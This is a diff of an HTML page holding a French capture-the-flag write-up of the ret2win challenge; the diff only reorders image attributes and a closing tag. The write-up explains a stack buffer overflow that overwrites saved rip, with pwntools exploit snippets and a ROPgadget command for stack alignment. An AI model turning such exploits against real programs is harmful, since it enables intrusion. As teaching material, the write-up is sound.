@@ -185,7 +185,7 @@
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">PIE</span><span style="color:#f92672">:</span>      <span style="color:#f92672">No</span> <span style="color:#f92672">PIE</span> <span style="color:#f92672">(</span><span style="color:#f92672">0x400000</span><span style="color:#f92672">)</span>
 </span></span></code></pre></div><h2 id="exploitation">Exploitation</h2>
 <p>On va le run et voir ce qu&rsquo;il se passe</p>
-<p><img alt="2023-01-13-194951_1041x663_scrot" src="https://user-images.githubusercontent.com/77807503/212438458-863bbd90-ce7f-4af6-bdd0-e56ac4a6ba7f.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/212438458-863bbd90-ce7f-4af6-bdd0-e56ac4a6ba7f.png" alt="2023-01-13-194951_1041x663_scrot"></p>
 <p>En lisant ce que le programme écrit on apprend plusieurs choses:</p>
 <ul>
 <li>La taille du buffer où est stocké notre input: 32 bytes</li>
@@ -255,8 +255,7 @@
 </span></span></code></pre></div><p>Ok, donc c&rsquo;est effectivement notre fonction win, puisqu&rsquo;elle passe <code>&quot;/bin/cat flag.txt&quot;</code> en argument dans <code>system()</code>.</p>
 <p>L&rsquo;idée va donc être d&rsquo;ajouter l&rsquo;adresse de cette fonction à la fin de notre payload, pour qu&rsquo;elle finisse dans la sauvegarde de <code>rip</code></p>
 <blockquote>
-<p>La sauvegarde de <code>rip</code> contient toujours l&rsquo;adresse de la prochaine instruction à éxecuter. Ici, en réecrivant sa valeur actuelle par l&rsquo;adresse de la fonction <code>ret2win</code>, on modifie la prochaine étape du programme en lui faisant appeler une fonction qui ne devait jamais être appelée. On a donc modifié son <strong>flux d&rsquo;éxecution</strong>.</p>
-</blockquote>
+<p>La sauvegarde de <code>rip</code> contient toujours l&rsquo;adresse de la prochaine instruction à éxecuter. Ici, en réecrivant sa valeur actuelle par l&rsquo;adresse de la fonction <code>ret2win</code>, on modifie la prochaine étape du programme en lui faisant appeler une fonction qui ne devait jamais être appelée. On a donc modifié son <strong>flux d&rsquo;éxecution</strong>.</p></blockquote>
 <p>On peut compléter notre exploit:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 </span></span><span style="display:flex;"><span>
@@ -275,7 +274,7 @@
 </span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
 </span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;flag:&#34;</span>,p<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
 </span></span></code></pre></div><p>Maintenant, on lance l&rsquo;exploit et on devrait avoir le flag</p>
-<p><img alt="2023-01-13-201012_1135x146_scrot" src="https://user-images.githubusercontent.com/77807503/212438841-fe612582-a330-472b-ba9b-c9fa7f237d8f.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/212438841-fe612582-a330-472b-ba9b-c9fa7f237d8f.png" alt="2023-01-13-201012_1135x146_scrot"></p>
 <p>Et&hellip; le flag n&rsquo;a pas été print car le programme a <code>segfault</code>. Puisque je suis sous Ubuntu 22.04, qui est une version ultérieure à la 18.04 je suis affecté par les problèmes de <strong>stack alignment</strong> (MOVAPS)</p>
 <p>Pour régler ça, on peut ajouter un gadget <code>ret</code>, qu&rsquo;on va trouver en utilisant <code>ROPgadget</code>, après notre padding</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#f92672">--</span>binary ret2win <span style="color:#f92672">|</span> grep ret
@@ -300,7 +299,7 @@
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
 </span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;flag:&#34;</span>,p<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
-</span></span></code></pre></div><p><img alt="2023-01-13-201337_1023x371_scrot" src="https://user-images.githubusercontent.com/77807503/212439094-3d54ce77-a9d1-485a-afe7-f1ae7bd3dea2.png"></p>
+</span></span></code></pre></div><p><img src="https://user-images.githubusercontent.com/77807503/212439094-3d54ce77-a9d1-485a-afe7-f1ae7bd3dea2.png" alt="2023-01-13-201337_1023x371_scrot"></p>
 <p>Et on a le flag, gg!</p>
 
       </div>
